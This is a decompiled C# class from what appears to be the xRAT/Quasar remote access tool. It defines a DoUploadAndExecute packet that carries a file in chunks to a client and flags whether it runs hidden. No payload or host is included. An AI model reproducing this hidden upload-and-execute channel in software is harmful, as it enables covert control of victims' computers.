using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x020000A0 RID: 160
	[Serializable]
	public class DoUploadAndExecute : IPacket
	{
		// Token: 0x170000AD RID: 173
		// (get) Token: 0x0600041F RID: 1055 RVA: 0x0000414C File Offset: 0x0000234C
		// (set) Token: 0x06000420 RID: 1056 RVA: 0x00004154 File Offset: 0x00002354
		public int ID { get; set; }

		// Token: 0x170000AE RID: 174
		// (get) Token: 0x06000421 RID: 1057 RVA: 0x0000415D File Offset: 0x0000235D
		// (set) Token: 0x06000422 RID: 1058 RVA: 0x00004165 File Offset: 0x00002365
		public string FileName { get; set; }

		// Token: 0x170000AF RID: 175
		// (get) Token: 0x06000423 RID: 1059 RVA: 0x0000416E File Offset: 0x0000236E
		// (set) Token: 0x06000424 RID: 1060 RVA: 0x00004176 File Offset: 0x00002376
		public byte[] Block { get; set; }

		// Token: 0x170000B0 RID: 176
		// (get) Token: 0x06000425 RID: 1061 RVA: 0x0000417F File Offset: 0x0000237F
		// (set) Token: 0x06000426 RID: 1062 RVA: 0x00004187 File Offset: 0x00002387
		public int MaxBlocks { get; set; }

		// Token: 0x170000B1 RID: 177
		// (get) Token: 0x06000427 RID: 1063 RVA: 0x00004190 File Offset: 0x00002390
		// (set) Token: 0x06000428 RID: 1064 RVA: 0x00004198 File Offset: 0x00002398
		public int CurrentBlock { get; set; }

		// Token: 0x170000B2 RID: 178
		// (get) Token: 0x06000429 RID: 1065 RVA: 0x000041A1 File Offset: 0x000023A1
		// (set) Token: 0x0600042A RID: 1066 RVA: 0x000041A9 File Offset: 0x000023A9
		public bool RunHidden { get; set; }

		// Token: 0x0600042B RID: 1067 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoUploadAndExecute()
		{
		}

		// Token: 0x0600042C RID: 1068 RVA: 0x000041B2 File Offset: 0x000023B2
		public DoUploadAndExecute(int id, string filename, byte[] block, int maxblocks, int currentblock, bool runhidden)
		{
			this.ID = id;
			this.FileName = filename;
			this.Block = block;
			this.MaxBlocks = maxblocks;
			this.CurrentBlock = currentblock;
			this.RunHidden = runhidden;
		}

		// Token: 0x0600042D RID: 1069 RVA: 0x000041E7 File Offset: 0x000023E7
		public void Execute(Client client)
		{
			client.SendBlocking<DoUploadAndExecute>(this);
		}
	}
}
